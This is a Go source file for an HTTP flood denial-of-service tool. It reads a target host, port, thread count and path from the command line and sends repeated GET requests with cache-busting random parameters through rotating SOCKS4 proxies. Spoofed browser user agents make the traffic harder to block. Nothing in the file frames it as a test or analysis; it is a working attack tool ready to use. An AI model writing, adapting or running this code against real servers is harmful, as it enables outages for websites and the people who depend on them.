package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"

	proxyclient "github.com/gamexg/ProxyClient"
)

var (
	_USERAGENTS, _PROXIES []string
	chars               = "qwertyuiopasdfghjklzxcvbnm1234567890"
	_HOST          = os.Args[1]
	_PORT        = os.Args[2]
	_THREADS         = os.Args[3]
	_PATH = os.Args[4]
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func readLines(fileName string) []string {
	var lines []string
	openFile, _ := os.Open(fileName)
	scanner := bufio.NewScanner(openFile)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

func randomChars() string {
	return string(chars[rand.Intn(len(chars))])
}

func randomIntn() string {
	return strconv.Itoa(rand.Intn(1000))
}

func randomParams() string {
	return "?" + randomChars() + randomIntn() + "=" + randomChars() + randomIntn()
}

func getUserAgent() string {
	osList := []string{
		"iOS",
		"Windows",
		"X11",
		"Android",
	}

	ios := []string{
		"iPhone; CPU iPhone OS 13_3 like Mac OS X",
		"iPad; CPU OS 13_3 like Mac OS X",
		"iPod touch; iPhone OS 4.3.3",
		"iPod touch; CPU iPhone OS 12_0 like Mac OS X",
	}

	android := []string{
		"Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
		"Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
		"Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
		"Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
		"Linux; Android 5.1.1; vivo X7 Build/LMY47V",
		"Linux; Android 6.0; Nexus 5 Build/MRA58N",
		"Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
		"Linux; Android 8.0.0; SM-N9500 Build/R16NW",
		"Linux; Android 9.0; SAMSUNG SM-G950U",
	}

	windows := []string{
		"Windows NT 10.0; Win64; X64",
		"Windows NT 10.0; WOW64",
		"Windows NT 5.1; rv:7.0.1",
		"Windows NT 6.1; WOW64; rv:54.0",
		"Windows NT 6.3; Win64; x64",
		"Windows NT 6.3; WOW64; rv:13.37",
	}

	x11 := []string{
		"X11; Linux x86_64",
		"X11; Ubuntu; Linux i686",
		"SMART-TV; Linux; Tizen 2.4.0",
		"X11; Ubuntu; Linux x86_64",
		"X11; U; Linux amd64",
		"X11; GNU/LINUX",
		"X11; CrOS x86_64 11337.33.7",
		"X11; Debian; Linux x86_64",
	}
	osName := osList[rand.Intn(len(osList))]
	var version string
	if osName == "iOS" {
		version = ios[rand.Intn(len(ios))]
	}
	if osName == "Android" {
		version = android[rand.Intn(len(android))]
	}
	if osName == "Windows" {
		version = windows[rand.Intn(len(windows))]
	}
	if osName == "X11" {
		version = x11[rand.Intn(len(x11))]
	}
	return "Mozzila 5.0 " + "(" + version + ")" + " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + strconv.Itoa(rand.Intn(91-60)+60) + ".0." + strconv.Itoa(rand.Intn(5000-4000)+4000) + "." + strconv.Itoa(rand.Intn(60-40)+40) + " Safari/537.36"
}

func getUserAgents(number int) []string {
	var userAgents []string
	for i := 0; i < number; i++ {
		userAgents = append(userAgents, getUserAgent())
	}
	return userAgents
}

func prepareRequest(_HOST string, _PORT string, _USERAGENTS []string, _PROXIES []string) {
	_USERAGENT := _USERAGENTS[rand.Intn(len(_USERAGENTS))]
	_PROXY := _PROXIES[rand.Intn(len(_PROXIES))]
	for i := 0; i <= 5; i++{
		makeRequest(_HOST, _PORT, _USERAGENT, _PROXY)
	}
	time.Sleep(1 * time.Second)
}
/////////////////////////////////////////////////////////////////////////////////////////
func makeRequest(_HOST string, _PORT string, _USERAGENT string, _PROXY string) {
	_ADDRESS := _HOST + ":" + _PORT
	var conn net.Conn
	var err error
	var headers string = "GET " + _PATH + randomParams() + " HTTP/1.1\r\n" + "Host: " + _HOST + "\r\n" + "Connection: Keep-Alive\r\n" + "Accept: */*\r\n" + "Cache-Control: no-cache\r\n" + "User-Agent: " + _USERAGENT + "\r\n" + "\r\n"
	dialer, err := proxyclient.NewProxyClient("socks4://" + _PROXY)
	if err != nil {
		dialer = nil
		return
	}
	conn, err = dialer.DialTimeout("tcp", _ADDRESS, 5 * time.Second)
	if _PORT == "443" {
		conn = tls.Client(conn, &tls.Config{
			ServerName: _HOST,
			InsecureSkipVerify: true,
		})
	}
	if err != nil {
		conn = nil
		return
	}
	defer conn.Close()
	for i := 0; i <= 100; i++ {
		conn.Write([]byte(headers))
	}
	fmt.Println(_PROXY + " sent requests.")
}
/////////////////////////////////////////////////////////////////////////////////////////
func main() {
	_PROXIES = readLines("socks4.txt")
	_USERAGENTS = getUserAgents(100)
	_THREADS, _ := strconv.Atoi(_THREADS)
	for count := 0; count < _THREADS; count++ {
		go prepareRequest(_HOST , _PORT, _USERAGENTS, _PROXIES)
	}
	time.Sleep(600 * time.Second)
}
